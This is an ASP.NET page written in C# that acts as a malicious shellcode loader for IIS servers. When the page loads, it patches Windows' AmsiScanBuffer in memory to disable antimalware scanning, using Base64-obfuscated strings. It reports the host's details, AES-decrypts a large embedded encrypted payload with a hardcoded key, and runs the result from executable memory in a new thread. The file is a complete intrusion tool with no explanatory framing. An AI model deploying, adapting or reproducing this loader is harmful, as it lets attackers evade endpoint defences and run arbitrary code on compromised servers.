<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Linq" %>

<script runat="server">

    // Base64 decode method
    public static byte[] FromBase64(string base64String)
    {
        return Convert.FromBase64String(base64String);
    }


    // Method to retrieve Windows version information
    private string GetWindowsVersion()
    {
        var osVersion = Environment.OSVersion;
        bool is64Bit = Environment.Is64BitOperatingSystem;

        string version = $"Platform: {osVersion.Platform}, Version: {osVersion.Version}, Service Pack: {osVersion.ServicePack}";

        return version;
    }

    // AMSI Bypass method with error handling
    public static void BypassAMSI()
    {
        // Obfuscated string for "amsi.dll"
        byte[] amsiDllBytes = FromBase64("YW1zaS5kbGw=");  // Base64 for "amsi.dll"
        string amsiDll = System.Text.Encoding.UTF8.GetString(amsiDllBytes);

        // Obfuscated string for "AmsiScanBuffer"
        byte[] amsiScanBufferBytes = FromBase64("QW1zaVNjYW5CdWZmZXI=");  // Base64 for "AmsiScanBuffer"
        string amsiScanBuffer = System.Text.Encoding.UTF8.GetString(amsiScanBufferBytes);

        // Try to load amsi.dll if it's not already loaded
        IntPtr amsiDllHandle = GetModuleHandle(amsiDll);
        if (amsiDllHandle == IntPtr.Zero)
        {
            // Manually load amsi.dll if not already loaded
            amsiDllHandle = LoadLibrary(amsiDll);
            if (amsiDllHandle == IntPtr.Zero)
            {
                throw new Exception("Failed to manually load amsi.dll");
            }
        }

        // Get the address of AmsiScanBuffer
        IntPtr amsiScanBufferAddr = GetProcAddress(amsiDllHandle, amsiScanBuffer);
        if (amsiScanBufferAddr == IntPtr.Zero)
        {
            throw new Exception("Failed to get address of AmsiScanBuffer");
        }

        // Example patch: "xor rax, rax; ret"
        byte[] patch = { 0xc3, 0x90, 0x90 };

        // Patch the AmsiScanBuffer function in memory
        IntPtr oldProtect;
        bool success = VirtualProtect(amsiScanBufferAddr, (UIntPtr)patch.Length, 0x40, out oldProtect);
        if (!success)
        {
            throw new Exception("Failed to change memory protection to writeable");
        }

        // Apply the patch
        Marshal.Copy(patch, 0, amsiScanBufferAddr, patch.Length);


    }

    // Declare necessary imports
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out IntPtr lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr LoadLibrary(string lpFileName);

    // Import necessary functions for modern execution
    [System.Runtime.InteropServices.DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    // Constants for memory allocation types
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;


    // convert a hex string to byte array
    static byte[] HexStringToByteArray(string hex)
    {
        return hex.Split(',')
                  .Select(h => Convert.ToByte(h.Trim().Replace("0x", ""), 16))
                  .ToArray();
    }

    public static byte[] ConvertHexStringToByteArray(string hex)
    {
        if (string.IsNullOrEmpty(hex) || hex.Length % 2 != 0)
            throw new ArgumentException("Invalid hex string.");

        return Enumerable.Range(0, hex.Length / 2)
                         .Select(x => Convert.ToByte(hex.Substring(x * 2, 2), 16))
                         .ToArray();
    }

    static byte[] DecryptAES(byte[] encryptedBytes, byte[] keyBytes, byte[] ivBytes)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = keyBytes;
            aes.IV = ivBytes;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
            {
                return PerformCryptography(encryptedBytes, decryptor);
            }
        }
    }

    // Perform cryptographic transformation (decryption in this case)
    static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
    {
        using (MemoryStream ms = new MemoryStream())
        {
            using (CryptoStream cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }
    }

    // Example modern execution (this method can vary depending on how you're running the modern)
    public static void Executemodern(byte[] modern)
    {

        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if(mem == null)
        {
            return;
        }
   
        // Example of executing modern (simple version, ensure proper method in practice)
        IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)modern.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(modern, 0, funcAddr, modern.Length);
        IntPtr qwerty = IntPtr.Zero;
        IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, funcAddr, IntPtr.Zero, 0, ref qwerty);
        //WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            BypassAMSI();  // Call the obfuscated AMSI bypass method
            Response.Write("AMSI Bypass Successful!<br />");
        }
        catch (Exception ex)
        {
            // Display the error message for troubleshooting
            Response.Write("AMSI Bypass Failed: " + ex.Message + "<br />");
        }

            // Get the detailed Windows version
            string osVersion = GetWindowsVersion();

            // Print the version to the page with line breaks
            Response.Write("Operating System Version: " + osVersion + "<br />");
            Response.Write("Machine Name: " + Environment.MachineName + "<br />");
            Response.Write("Is 64-bit OS: " + Environment.Is64BitOperatingSystem + "<br />");

        // Sample AES key and IV (replace with your actual values)
        //byte[] aesKey = Convert.FromBase64String("OTU1NTE2ODA4NzU0ZDhmMGE4N2RhNGIwZTM3Y2NjZmE1MzA0MmZlMDA1ZDFkNjliZmVlYzU4ODJmY2U0NTkxOQo=");
        //byte[] aesIV = Convert.FromBase64String("MTMzNDcxYzI0ZGI1ZTdmZmU2ZjZkMjE2ZGMzYTM2MzcK");
        byte[] aesKey = ConvertHexStringToByteArray("82c6bb1e1a938b0b0b99fe0b6d686b6c2fc05d05f78adde6a77e640f8bf8e26e");
        byte[] aesIV = ConvertHexStringToByteArray("85ed3e38be69e355486617cedb5c807b");
        
        if (aesKey.Length != 32) // 256 bits = 32 bytes
        {
            throw new ArgumentException("Key must be 256 bits (32 bytes) for AES-256: "+ aesKey.Length);
        }

        if (aesIV.Length != 16) // IV is always 128 bits = 16 bytes for AES
        {
            throw new ArgumentException("IV must be 128 bits (16 bytes) for AES.");
        }

        byte[] modern = null; // Declare modern outside the if block

       // Check key length and decrypt
       if (aesKey.Length == 16 || aesKey.Length == 24 || aesKey.Length == 32)
        {
                // AES encrypted modern (replace with your actual encrypted modern)
                byte[] encryptedBytes = Convert.FromBase64String("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");

                modern = DecryptAES(encryptedBytes, aesKey, aesIV);
                if (modern == null)
                {
                    Response.Write("Decryption failed. modern is null.<br />");
                    return;
                }

                // Output decrypted data as a string for testing (assuming UTF8 encoding)
                Response.Write(Encoding.UTF8.GetString(modern) + "<br />");
                
                byte[] runner = HexStringToByteArray(Encoding.UTF8.GetString(modern));

                // Print modern as hex to verify (optional)
                //string hexmodern = BitConverter.ToString(modern).Replace("-", "");
                //Response.Write("Decrypted modern (Hex): " + hexmodern);

                // Execute the modern
                Executemodern(runner);

        }
        else
        {
            Response.Write("Invalid key length. Key must be 16, 24, or 32 bytes.<br />");
        }

    }

</script>
